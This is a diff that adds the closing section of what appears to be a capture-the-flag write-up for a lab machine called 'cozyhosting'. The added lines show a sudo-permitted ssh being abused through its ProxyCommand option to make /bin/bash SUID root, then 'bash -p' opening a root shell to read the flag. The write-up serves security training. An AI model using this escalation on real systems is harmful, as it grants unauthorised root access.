@@ -445,3 +445,27 @@ User josh may run the following commands on localhost:
 ```
 
 <br />
+
+We can `run ssh` as `root`, this is very `dangerous` because ssh has a `option` to run `commands`.
+
+<br />
+
+```bash
+josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand='chmod 4755 /bin/bash' x
+kex_exchange_identification: Connection closed by remote host
+Connection closed by UNKNOWN port 65535
+josh@cozyhosting:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+josh@cozyhosting:~$ bash -p
+bash-5.1# cd /root
+bash-5.1# cat root.txt
+b6515791e1cac992937d8180fbxxxxxx
+```
+
+<br />
+
+GG!! Machine Rooted!!
+
+I learn a lot with this machine about new concepts like IFS that i never have touched before. Hope you too. Keep hacking!!❤️❤️
+
+<br />
